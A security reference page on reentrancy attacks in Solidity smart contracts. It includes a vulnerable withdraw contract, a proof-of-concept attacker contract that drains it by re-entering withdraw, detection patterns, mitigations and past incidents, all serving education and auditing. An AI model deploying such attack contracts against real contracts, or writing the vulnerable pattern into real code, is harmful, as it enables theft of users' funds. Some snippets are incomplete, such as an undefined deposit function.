# Reentrancy Attack Pattern

## Description

Reentrancy occurs when an external call allows the called contract to callback into the calling contract before the first invocation completes, potentially executing the same function multiple times.

## Severity

**CRITICAL** - Can lead to complete fund drainage

## Impact

- Theft of all contract funds
- Double spending
- Accounting corruption

## Vulnerable Pattern

```solidity
contract Vulnerable {
    mapping(address => uint) public balances;

    function withdraw() external {
        uint amount = balances[msg.sender];

        // ‚ùå External call BEFORE state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);

        // State updated too late
        balances[msg.sender] = 0;
    }
}
```

## Attack Code

```solidity
contract Attacker {
    Vulnerable target;
    uint count;

    constructor(address _target) {
        target = Vulnerable(_target);
    }

    function attack() external payable {
        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    receive() external payable {
        if (count < 10 && address(target).balance >= 1 ether) {
            count++;
            target.withdraw();  // Reenter!
        }
    }
}
```

## Detection Strategy

### Code Patterns to Search

- `.call{value: }("")`
- `.transfer()` and `.send()` (less dangerous but still check)
- External contract calls before state updates

### Questions to Ask

1. Are there external calls in this function?
2. Is state updated AFTER the external call?
3. Is there a reentrancy guard (`nonReentrant` modifier)?
4. Does the function follow Checks-Effects-Interactions pattern?

## Mitigation

### 1. Reentrancy Guard (Recommended)

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Secure is ReentrancyGuard {
    function withdraw() external nonReentrant {
        uint amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }
}
```

### 2. Checks-Effects-Interactions Pattern

```solidity
function withdraw() external {
    uint amount = balances[msg.sender];

    // Effects BEFORE interactions
    balances[msg.sender] = 0;

    // Interactions last
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
}
```

## Real-World Examples

- **The DAO Hack (2016)**: $60M stolen via reentrancy
- **Cream Finance (2021)**: $130M lost
- **Grim Finance (2021)**: $30M drained

## References

- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [The DAO Hack Explained](https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/)
